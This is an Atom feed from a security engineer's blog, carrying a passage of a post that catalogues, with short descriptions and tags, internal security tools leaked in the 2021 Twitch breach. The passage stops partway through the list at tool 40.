<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="https://mazinahmed.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mazinahmed.net/" rel="alternate" type="text/html" /><updated>2022-06-01T09:20:07-05:00</updated><id>https://mazinahmed.net/feed.xml</id><title type="html">Mazin Ahmed</title><subtitle>Cyber Security Engineer (Offensive Security)</subtitle><entry><title type="html">Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools</title><link href="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/" rel="alternate" type="text/html" title="Twitch Internal Security Tools: In-depth Analysis of the Leaked Twitch Security Tools" /><published>2022-05-31T00:00:00-05:00</published><updated>2022-05-31T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools</id><content type="html" xml:base="https://mazinahmed.net/blog/indepth-analysis-twitch-security-tools/">&lt;h2&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mazen160/public/master/static/images/banner%20-%20Twitch%20Internal%20Security%20Tools%20blog%20post.png&quot; alt=&quot;&quot; /&gt;&lt;/h2&gt;

&lt;p&gt;How Twitch was hacked? What security controls did Twitch build?&lt;/p&gt;

&lt;p&gt;The Twitch breach revealed more than 120 internal security tools developed by the Twitch security team.&lt;/p&gt;

&lt;p&gt;I analyzed all the leaked security tools that were developed by Twitch Security. Check out the full research.&lt;/p&gt;

&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
&lt;p&gt;Twitch is an interactive live-streaming service for content, gaming, entertainment, sports, and music. In 2015, Amazon acquired Twitch for $970 million, and after COVID-19 time, its market value skyrocketed as more people adapted live-streaming from home.&lt;/p&gt;

&lt;p&gt;On October 6, 2021, it was announced that Twitch suffered a massive data breach that leaked their source-code, internal databases, revenue documents, and payouts documents of their members.&lt;/p&gt;

&lt;p&gt;The security tools of Twitch were leaked during the breach. Twitch Security has clearly invested a lot of time and effort in building its security program. This can be seen from the tools published on the Internet; the majority of companies with mature security programs today do not have 50% of what Twitch security internally built over the years.&lt;/p&gt;

&lt;p&gt;I analyzed all the security tools written by Twitch security. I thoroughly reviewed the source code, configurations, build config process, and everything that has been leaked and became public knowledge on the Internet within the breach.&lt;/p&gt;

&lt;p&gt;In this blog post, I’m analyzing all the security tools that Twitch security built within their security program. I’m also tagging them based on the use case, services, and categories. This research should act as a reference to learn how modern security teams build their programs, and to hopefully get inspired into enhancing currently-running security programs.&lt;/p&gt;

&lt;p&gt;At the end of the blog post, I will share my thoughts on the breach, how I feel about it, and what could have been done by Twitch to handle this breach in better ways.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;table-of-content&quot;&gt;Table of Content&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;Background&lt;/li&gt;
  &lt;li&gt;Leaked Tools&lt;/li&gt;
  &lt;li&gt;Final Thoughts&lt;/li&gt;
  &lt;li&gt;References&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;who-am-i&quot;&gt;Who Am I?&lt;/h1&gt;

&lt;p&gt;I’m a cyber security engineer that specializes in AppSec, InfraSec and building security programs. Read more about my previous work at &lt;a href=&quot;https://mazinahmed.net&quot;&gt;mazinahmed.net&lt;/a&gt;. I also built &lt;a href=&quot;https://fullhunt.io&quot;&gt;FullHunt.io&lt;/a&gt;, &lt;a href=&quot;https://stressful.io&quot;&gt;Stressful.io&lt;/a&gt;, &lt;a href=&quot;https://github.com/mazen160/tfquery&quot;&gt;tfquery&lt;/a&gt;, and few open-source security tools.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;leaked-tools&quot;&gt;Leaked Tools&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;1) Tool&lt;/strong&gt;: agentconn&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A simple Go package to open an ssh-agent socket.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;package&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;2) Tool&lt;/strong&gt;: apache-pf-deb-build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Apache PingFederate Module Deb Package Builder.&lt;/p&gt;

&lt;p&gt;PingFederate is an enterprise federation server that enables user authentication and single sign-on. It serves as a global authentication authority that allows employees, customers, and partners to securely access all the applications they need from any device.&lt;/p&gt;

&lt;p&gt;This module is a builder for integrating PingFederate with Apache.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authentication&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorization&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pingfederate&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;3) Tool&lt;/strong&gt;: AWS-Cloudtrail-Security-Configs&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Miscellaneous scripts for configuring AWS cloudtrails&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudtrails&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;4) Tool&lt;/strong&gt;: AWS-Cloudtrail-Security-tform&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is the terraform version of the configuration at AWS-Cloudtrail-Security-Configs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudtrails&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;5) Tool&lt;/strong&gt;: bastion-squid-build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A patch file for Squid config that is used on “Bastions” service.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squid&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;6) Tool&lt;/strong&gt;: bastionmetrics&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An old script that pushes logs from a service called “Bastions”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logging&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;7) Tool&lt;/strong&gt;: beholder&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An internal Python Flask app for Security to run reports against Jira and Google Sheets to get team program reports and metrics.&lt;/p&gt;

&lt;p&gt;It also has a script to login to ECR using AWS aws role-assume with the duration of 900 seconds, and stores secrets within AWS Secrets Manager.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reporting&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google-spreadsheets&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;8) Tool&lt;/strong&gt;: beholder-terraform&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Configuration for deploying “beholder” project through Terraform.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;9) Tool&lt;/strong&gt;: cdn_finder&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is a script to take zone files / DNS records, pull the CNAME, and determine what CDNs are in use based on the associated CNAME.&lt;/p&gt;

&lt;p&gt;The script has an SSL certificate parser, but the data pulling capability is manual. It has instructions on how to pull DNS records from Infoblox (a cloud product that runs DNS management services), and AWS Route53&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdn&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;10) Tool&lt;/strong&gt;: cfn-templates&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Incomplete repository for AWS CloudFormation templates&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;11) Tool&lt;/strong&gt;: cloudflare-lambda&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Lambda that continuously hits CloudFlare API, pulls requests logs, and pushes it to S3.&lt;/p&gt;

&lt;p&gt;CloudFlare supports by default automated archiving to S3. It’s not clear why this option was made instead of using the CloudFlare option.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudflare&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logging&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;12) Tool&lt;/strong&gt;: cloudflare-parsing&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script to parse CloudFlare logs into a format that is easier to read.&lt;/p&gt;

&lt;p&gt;It supports two formats, custom JSON format, and another format that is easier to use with AWS Athena.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;athena&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudflare&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logging&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;13) Tool&lt;/strong&gt;: cloudflare 2 elasticsearch&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script to push Cloudflare logs from a local machine to Elasticsearch.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudflare&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elasticsearch&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;14) Tool&lt;/strong&gt;: codename-generator&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script to generate code names through the “pycorpora” Python package.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miscs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;15) Tool&lt;/strong&gt;: contingent-auth-policies&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A repo that stores a single AWS policy.&lt;/p&gt;

&lt;p&gt;The policy seems to be permissive and allows actions that can be insecure. Also, it’s set to “*” wildcard resources. It’s not clear who has this policy assigned to.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;16) Tool&lt;/strong&gt;: credentialchecker&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A lambda app that checks for leaked credentials against Twitch for risk calculation purposes. Also called “
Arstotzka”.
It takes a list of breach lists (email:password, username:password), and runs the data against Twitch users. It runs manually; not when a user-logged in against the hash, so it’s unclear how passwords are stored internally (is it stored in plain text? that’s why this tool is made possible?).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwords&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;17) Tool&lt;/strong&gt;: credentialchecker-vendor&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Vendor packages for credentialchecker build.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miscs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;18) Tool&lt;/strong&gt;: ctfd&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Clone of the CTFd public platform repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;19) Tool&lt;/strong&gt;: cwijulia-sandbox&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A security experiment to evaluate the accuracy of results provided by AWS ECR vulnerabilities feeds.&lt;/p&gt;

&lt;p&gt;Part 1: Terraform code is made to set up a network on AWS. It sets up EC2, VPC, route tables, and subnets through Terraform modules.
Part 2: It deploys an ECR image that has a vulnerable Cron package. This image will be ideally scanned by AWS ECR. The goal is to find if AWS ECR will report the vulnerable Cron package through its identified vulnerabilities feeds. This process is automated through different scripts.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;research&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ecr&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerability&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;20) Tool&lt;/strong&gt;: duo_logging&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: CloudFormation configuration to configure a Lambda to write Duo Security logs to S3.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;21) Tool&lt;/strong&gt;: duoauthproxy&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Duo Security Authentication proxy - Empty repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;22) Tool&lt;/strong&gt;: duoauthproxy_build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Duo Authentication Security - Build package.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;23) Tool&lt;/strong&gt;: duoauthproxy-build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Duo Authentication Security - Build package, made for Ubuntu.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;24) Tool&lt;/strong&gt;: ephemeral cert&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Golang package to generate self-signed TLS certificates and return tls.Certificate object with a default common name to “localhost”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certificate&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;25) Tool&lt;/strong&gt;: fluxo&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A tool to fetch data from an Amazon service that seems to be for threat intelligence, and stores it on Jira and Dynamodb.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-intel&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amazon&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamo&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;26) Tool&lt;/strong&gt;: go-audit&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Clone of the public go-audit repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miscs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;27) Tool&lt;/strong&gt;: go-audit-build&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Build package for go-audit.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miscs&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;28) Tool&lt;/strong&gt;: go-sirtbot&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Slack bot written in Golang - seems incomplete.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slack&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;29) Tool&lt;/strong&gt;: go-squid-duoauth&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Squid Go Authentication Helper. Deprecated project.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo-security&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squid&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;30) Tool&lt;/strong&gt;: go-ykpiv&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An internal fork of go-ykpiv. go-ykpiv is a Golang interface to manage Yubikeys, including a crypto.Signer &amp;amp; crypto.Decrypter interface.&lt;/p&gt;

&lt;p&gt;The changes related to this package are within the build process.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yubi-keys&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crypto&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;31) Tool&lt;/strong&gt;: golang-x-crypto&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A clone of Golang crypto libraries.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crypto&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;32) Tool&lt;/strong&gt;: gophish-config&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Minimal configurations for GoPhish server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gophish&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;33) Tool&lt;/strong&gt;: gravitational-teleport&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Clone for Gravitational Teleport, Certificate authority and access plane for SSH, Kubernetes, web applications, and databases.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubernetes&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teleport&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbac&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;34) Tool&lt;/strong&gt;: gsuite-hourly&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A script that pulls logs from Google Gsuite every hour, and store it into AWS S3.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gsuite&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logging&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;35) Tool&lt;/strong&gt;: homebrew&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: a Homebrew repository that hosts macOS software distributed by the
security team.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;macos&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;homebrew&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;36) Tool&lt;/strong&gt;: hunts&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Threat Hunting playbooks. It consists of  write-ups of running threat hunt activities for AWS, Duo Implementation, Command and Control activities, reverse TCP tunneling, and general suspicious activities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-hunting&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;37) Tool&lt;/strong&gt;: Inquisitor&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A well-architectured secrets discovery tool that can identify secrets within JIRA tickets and Git commits. It also has an integration with alerting via modules, including standard screen logging, email alerting, and creating a ticket on Jira.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appsec&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret-detection&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;38) Tool&lt;/strong&gt;: jupyterhub&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Shared notebook environment for SIRT.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jupyter&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notebook&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;39) Tool&lt;/strong&gt;: lambda-amazonsg&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Lambda function to manage security groups within AWS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-groups&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;40) Tool&lt;/strong&gt;: lambda-athenalert&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An AWS Lambda function that can automatically run an Athena query
and raise an alert if there are any results. It is most useful when run on a
cron via CloudWatch events.&lt;/p&gt;

